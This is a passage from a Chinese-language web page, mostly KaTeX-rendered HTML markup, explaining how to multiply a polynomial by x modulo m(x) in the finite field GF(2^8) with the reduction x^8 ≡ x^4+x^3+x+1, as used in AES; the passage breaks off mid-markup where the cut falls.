<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>x</mi><mn>8</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>m</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">[</mo><mi>m</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mtext>–</mtext><msup><mi>x</mi><mn>8</mn></msup><mo stretchy="false">]</mo><mo>=</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mspace width="2em"/><mi>A</mi><mtext>式</mtext></mrow><annotation encoding="application/x-tex">x^8 mod m(x) = [m(x) – x^8] = x^4 + x^3 +x +1 \qquad A式
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">–</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:2em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">式</span></span></span></span></span></p>
<p>对于多项式 f (x)</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>b</mi><mn>7</mn></msub><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msub><mi>b</mi><mn>6</mn></msub><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msub><mi>b</mi><mn>5</mn></msub><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msub><mi>b</mi><mn>4</mn></msub><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msub><mi>b</mi><mn>3</mn></msub><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mi>x</mi><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub><mspace linebreak="newline"></mspace><mi>x</mi><mo>∗</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>b</mi><mn>7</mn></msub><msup><mi>x</mi><mn>8</mn></msup><mo>+</mo><msub><mi>b</mi><mn>6</mn></msub><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msub><mi>b</mi><mn>5</mn></msub><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msub><mi>b</mi><mn>4</mn></msub><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msub><mi>b</mi><mn>3</mn></msub><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub><mi>x</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>m</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>若</mtext><msub><mi>b</mi><mn>7</mn></msub><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mtext>结果是小于</mtext><mn>8</mn><mtext>的多项式，无需取模计算；</mtext><mspace linebreak="newline"></mspace><mtext>若</mtext><msub><mi>b</mi><mn>7</mn></msub><mo>=</mo><mn>1</mn><mtext>，代入</mtext><mi>A</mi><mtext>式得到：</mtext><mspace linebreak="newline"></mspace><mi>x</mi><mo>∗</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>b</mi><mn>6</mn></msub><msup><mi>x</mi><mn>7</mn></msup><mo>+</mo><msub><mi>b</mi><mn>5</mn></msub><msup><mi>x</mi><mn>6</mn></msup><mo>+</mo><msub><mi>b</mi><mn>4</mn></msub><msup><mi>x</mi><mn>5</mn></msup><mo>+</mo><msub><mi>b</mi><mn>3</mn></msub><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><msub><mi>b</mi><mn>0</mn></msub><mi>x</mi><mo>+</mo><mo stretchy="false">(</mo><msup><mi>x</mi><mn>4</mn></msup><mo>+</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)=b_{7}x^7+b_{6}x^6+b_{5}x^5+b_{4}x^4+b_{3}x^3+b_{2}x^2+b_{1}x+b_{0}\\x*f(x)=b_{7}x^8+b_{6}x^7+b_{5}x^6+b_{4}x^5+b_{3}x^4+b_{2}x^3+b_{1}x^2+b_{0}xmodm(x)\\若b_{7}=0,结果是小于8的多项式，无需取模计算；\\若b_{7}=1，代入A式得到：\\x*f(x)=b_{6}x^7+b_{5}x^6+b_{4}x^5+b_{3}x^4+b_{2}x^3+b_{1}x^2+b_{0}x+(x^4 + x^3 +x +1)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">于</span><span class="mord">8</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">多</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">无</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">；</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">入</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">：</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span 